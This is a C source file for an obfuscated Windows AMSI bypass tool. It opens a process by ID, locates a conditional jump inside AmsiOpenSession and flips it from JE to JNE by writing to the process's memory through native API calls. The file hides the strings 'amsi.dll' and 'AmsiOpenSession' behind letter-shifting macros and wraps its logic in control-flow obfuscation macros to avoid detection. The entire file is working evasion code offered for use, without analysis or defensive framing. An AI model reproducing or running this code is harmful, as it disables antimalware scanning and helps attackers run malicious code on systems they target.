#include <Windows.h>
#include <stdio.h>
#include "Header.h"
#pragma comment(lib, "ntdll")


#ifndef NT_SUCCESS
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#endif
#define HIDE_LETTER(a)   (a) + 0x50
#define UNHIDE_STRING(str)  do { char * ptr = str ; while (*ptr) *ptr++ -= 0x50; } while(0)
#define HIDE_STRING(str)  do {char * ptr = str ; while (*ptr) *ptr++ += 0x50;} while(0)




EXTERN_C NTSTATUS NtProtectVirtualMemory(
	IN HANDLE ProcessHandle,
	IN OUT PVOID* BaseAddress,
	IN OUT PSIZE_T RegionSize,
	IN ULONG NewProtect,
	OUT PULONG OldProtect);

EXTERN_C NTSTATUS NtWriteVirtualMemory(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);


DWORD64 GetAddr(LPVOID addr) {
	OBF_BEGIN
	INT i = N(0);
	FOR (V(i)=N(0), V(i) < N(1024), V(i)++)
		IF (*((PBYTE)addr + i) == 0x74)
			RETURN ((DWORD64)addr + i);
		ENDIF
	ENDFOR
	OBF_END

}


DWORD64 patch(HANDLE hproc) {
	OBF_BEGIN
	char ams1[] = { HIDE_LETTER('a'),HIDE_LETTER('m'),HIDE_LETTER('s'),HIDE_LETTER('i'),HIDE_LETTER('.'),HIDE_LETTER('d'),HIDE_LETTER('l'),HIDE_LETTER('l'),HIDE_LETTER(0) };
	char ams10pen[] = { HIDE_LETTER('A'),HIDE_LETTER('m'),HIDE_LETTER('s'),HIDE_LETTER('i'),HIDE_LETTER('O'),HIDE_LETTER('p'),HIDE_LETTER('e'),HIDE_LETTER('n'),HIDE_LETTER('S'),HIDE_LETTER('e'),HIDE_LETTER('s'),HIDE_LETTER('s'),HIDE_LETTER('i'),HIDE_LETTER('o'),HIDE_LETTER('n'),HIDE_LETTER(0) };
	UNHIDE_STRING(ams1);
	UNHIDE_STRING(ams10pen);
	void* ptr = GetProcAddress(LoadLibraryA(ams1), ams10pen);
	HIDE_STRING(ams1);
	HIDE_STRING(ams10pen);
	char Patch[100];
	ZeroMemory(Patch, 100);
	lstrcatA(Patch, "\x75");

	DWORD OldProtect = N(0);
	SIZE_T memPage = 0x1000;
	void* ptraddr = (void*)((DWORD64)ptr + 0x3);
	void* ptraddr2 = (void*)GetAddr(ptr);
		
	NTSTATUS NtProtectStatus1 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, 0x04, &OldProtect);
	IF (!NT_SUCCESS(NtProtectStatus1)) 
		printf("[!] Failed in NtProtectVirtualMemory1 (%u)\n", GetLastError());
		RETURN ( - 1);
	ENDIF
	NTSTATUS NtWriteStatus = NtWriteVirtualMemory(hproc, (void*)GetAddr(ptr), (PVOID)Patch, 1, (SIZE_T*)nullptr);
	IF (!NT_SUCCESS(NtWriteStatus))
		printf("[!] Failed in NtWriteVirtualMemory (%u)\n", GetLastError());
		RETURN ( - 1);
	ENDIF
	NTSTATUS NtProtectStatus2 = NtProtectVirtualMemory(hproc, &ptraddr2, (PSIZE_T)&memPage, OldProtect, &OldProtect);
	IF (!NT_SUCCESS(NtProtectStatus2)) 
		printf("[!] Failed in NtProtectVirtualMemory2 (%u)\n", GetLastError());
		RETURN  ( - 1);
	ENDIF
	
	printf("\n[+] patched :D\n\n");
	OBF_END



}

int main(int argc, char** argv) {

	HANDLE hProc;

	OBF_BEGIN
	IF (argc != N(2)) 
		RETURN (N(1));
	ENDIF

	hProc = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, (DWORD)atoi(argv[N(1)]));
	IF (!hProc) 
		printf("Failed in OpenProcess (%u)\n", GetLastError());
		RETURN (N(2));
	ENDIF

	
	DWORD64 test = patch(hProc);
	

	RETURN (N (0));
	OBF_END

}